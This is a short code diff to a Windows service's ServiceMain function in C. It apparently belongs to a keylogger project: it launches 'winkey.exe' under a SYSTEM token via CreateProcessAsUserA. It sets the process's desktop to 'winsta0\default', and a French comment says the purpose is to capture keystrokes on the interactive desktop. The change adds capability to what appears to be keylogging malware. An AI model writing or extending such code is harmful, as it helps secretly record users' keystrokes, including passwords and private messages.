@@ -83,6 +83,7 @@ void WINAPI ServiceMain(DWORD argc, LPSTR *argv)
     PROCESS_INFORMATION process_info;
     ZeroMemory(&startup_info, sizeof(STARTUPINFOA));
     startup_info.cb = sizeof(STARTUPINFOA);
+    startup_info.lpDesktop = (LPSTR)"winsta0\\default"; // Attachement au bureau interactif pour capturer les frappes
     ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
 
     // Génération dynamique du chemin vers winkey.exe
@@ -98,6 +99,7 @@ void WINAPI ServiceMain(DWORD argc, LPSTR *argv)
     if (!CreateProcessAsUserA(
             system_token,
             winkey_path,
+            NULL,
             NULL,
             NULL,
             FALSE,
